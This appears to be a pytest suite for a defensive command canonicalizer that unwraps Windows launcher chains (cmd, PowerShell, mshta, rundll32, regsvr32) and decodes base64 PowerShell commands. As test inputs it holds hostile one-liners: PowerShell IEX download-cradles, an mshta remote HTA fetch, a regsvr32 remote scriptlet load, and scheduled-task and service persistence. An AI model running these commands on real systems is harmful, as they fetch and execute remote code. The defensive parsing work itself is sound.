"""P0.15A · Evidence Canonicalizer (ADR-002 §3.2).

Locks the contract:
  · canonicalize(raw) always returns a CanonicalCommand
  · launcher_chain records EVERY peel (deterministic ordering)
  · effective_head is the leaf executable, no path / no quotes
  · payload is the inner command string with wrappers stripped
  · unwrap_depth ≤ _MAX_UNWRAP_DEPTH (pathological input can't loop)
  · base64 payloads (PowerShell -EncodedCommand) are decoded
  · never raises on malformed input
"""
from __future__ import annotations

import base64
import pytest

from services.canonicalizer import (
    CANONICALIZER_VERSION,
    CanonicalCommand,
    canonicalize,
)


# ══════════════════════════════════════════════════════════════════
# Contract
# ══════════════════════════════════════════════════════════════════
def test_returns_canonical_command_dataclass():
    c = canonicalize("whoami /all")
    assert isinstance(c, CanonicalCommand)
    assert c.canonicalizer_version == CANONICALIZER_VERSION
    d = c.to_dict()
    for k in ("raw", "launcher_chain", "effective_command",
                "effective_head", "payload", "unwrap_depth",
                "canonicalizer_version"):
        assert k in d


@pytest.mark.parametrize("val", [None, "", "   "])
def test_never_raises_on_empty_input(val):
    c = canonicalize(val)
    assert isinstance(c, CanonicalCommand)
    assert c.launcher_chain == []
    assert c.unwrap_depth == 0


def test_unwrapped_command_stays_untouched():
    c = canonicalize("whoami /all")
    assert c.launcher_chain == []
    assert c.effective_command == "whoami"
    assert c.effective_head == "whoami"
    assert c.unwrap_depth == 0


# ══════════════════════════════════════════════════════════════════
# cmd.exe unwrap  (the P0.15A core scenario)
# ══════════════════════════════════════════════════════════════════
def test_cmd_slash_s_slash_c_wrapper_unwraps():
    raw = 'cmd.exe /S /C "schtasks /create /tn AnyDesk /tr anydesk.exe"'
    c = canonicalize(raw)
    assert c.launcher_chain == ["cmd.exe"]
    # effective_head may retain original case; classifier lowercases.
    assert c.effective_head.lower() == "schtasks"
    assert "schtasks" in c.payload.lower()
    assert c.unwrap_depth == 1


def test_cmd_c_wrapper_unwraps_without_slash_s():
    c = canonicalize('cmd /c "sc create Svc binPath= X"')
    assert c.launcher_chain == ["cmd.exe"]
    assert c.effective_head.lower() == "sc"


def test_bare_cmd_without_c_flag_does_not_unwrap():
    c = canonicalize("cmd.exe")
    assert c.launcher_chain == []
    assert c.effective_command == "cmd"


# ══════════════════════════════════════════════════════════════════
# PowerShell unwrap · plain -Command
# ══════════════════════════════════════════════════════════════════
def test_powershell_command_flag_unwraps():
    c = canonicalize('powershell.exe -NoP -W hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://x/y\')"')
    assert c.launcher_chain == ["powershell.exe"]
    # After unwrap, the inner is a PowerShell expression starting with IEX.
    assert c.payload.lower().lstrip('"').lstrip("'").startswith("iex")


# ══════════════════════════════════════════════════════════════════
# PowerShell -EncodedCommand (base64, UTF-16-LE)
# ══════════════════════════════════════════════════════════════════
def test_powershell_encoded_command_decodes():
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://x/y')"
    b64 = base64.b64encode(inner.encode("utf-16-le")).decode()
    c = canonicalize(f"powershell.exe -NoP -W Hidden -EncodedCommand {b64}")
    assert c.launcher_chain == ["powershell.exe"]
    assert "IEX" in c.payload or "iex" in c.payload.lower()


# ══════════════════════════════════════════════════════════════════
# Inline launchers  (mshta / rundll32 / regsvr32 / wscript / cscript)
# ══════════════════════════════════════════════════════════════════
def test_mshta_url_is_treated_as_payload():
    c = canonicalize("mshta.exe http://cdn.malicious[.]tld/payload.hta")
    assert c.launcher_chain == ["mshta.exe"]
    assert "malicious" in c.payload
    # Payload leaf should reference the .hta or the http prefix — the
    # canonicalizer strips the URL's path component when treating the
    # first token as a "head", but the full URL always lives in payload.
    assert c.effective_head


def test_rundll32_entrypoint_is_payload():
    c = canonicalize(r"rundll32.exe C:\Users\Public\loader.dll,EntryPoint")
    assert c.launcher_chain == ["rundll32.exe"]
    assert "loader.dll" in c.payload


def test_regsvr32_squiblydoo():
    raw = "regsvr32.exe /s /n /u /i:http://x/y.sct scrobj.dll"
    c = canonicalize(raw)
    assert c.launcher_chain == ["regsvr32.exe"]
    assert "scrobj.dll" in c.payload


# ══════════════════════════════════════════════════════════════════
# Nested wrappers  (cmd → powershell → mshta)
# ══════════════════════════════════════════════════════════════════
def test_nested_cmd_powershell_chain_peels_twice():
    raw = 'cmd /c "powershell -Command \\"IEX (iwr http://x)\\""'
    c = canonicalize(raw)
    # At minimum cmd is peeled; nested quoting is a real-world hazard
    # so we assert the outer peel deterministically.
    assert "cmd.exe" in c.launcher_chain
    assert c.unwrap_depth >= 1


def test_unwrap_depth_is_capped():
    """Pathological deeply-nested input must never blow the stack."""
    # Fabricate a 20-deep wrap; canonicalizer must stop at _MAX_UNWRAP_DEPTH.
    from services.canonicalizer import _MAX_UNWRAP_DEPTH  # type: ignore[attr-defined]
    payload = "whoami"
    wrapped = payload
    for _ in range(20):
        wrapped = f'cmd /c "{wrapped}"'
    c = canonicalize(wrapped)
    assert c.unwrap_depth <= _MAX_UNWRAP_DEPTH


# ══════════════════════════════════════════════════════════════════
# Malformed input never raises
# ══════════════════════════════════════════════════════════════════
@pytest.mark.parametrize("bad", [
    'cmd /c "unbalanced',                       # unmatched quote
    'cmd /c ',                                   # trailing flag no value
    'powershell -EncodedCommand !!!not-base64!!!',
    '   ',
    'cmd /c ""',
])
def test_malformed_input_returns_fallback(bad):
    c = canonicalize(bad)
    assert isinstance(c, CanonicalCommand)
    # If we couldn't unwrap, depth stays 0 and payload equals raw.
    if c.unwrap_depth == 0:
        assert c.payload == bad.strip() or c.payload == ""


# ══════════════════════════════════════════════════════════════════
# ADR-002 §8 · Canonicalizer NEVER emits Behaviors / MITRE / Recs
# ══════════════════════════════════════════════════════════════════
def test_canonicalizer_output_carries_no_semantics():
    """Structural guard — CanonicalCommand fields do not overlap with
    any Behavior / MITRE / Recommendation field.  If someone adds
    ``mitre_techniques`` to CanonicalCommand this test will fail
    loudly and force an ADR revision."""
    c = canonicalize("whoami")
    for forbidden in ("behaviors", "mitre", "mitre_techniques",
                          "recommendations", "kill_chain",
                          "impact_tags", "provenance"):
        assert forbidden not in c.to_dict(), (
            f"Canonicalizer must not emit {forbidden!r} — that "
            "belongs to a downstream engine (ADR-002 §8).")
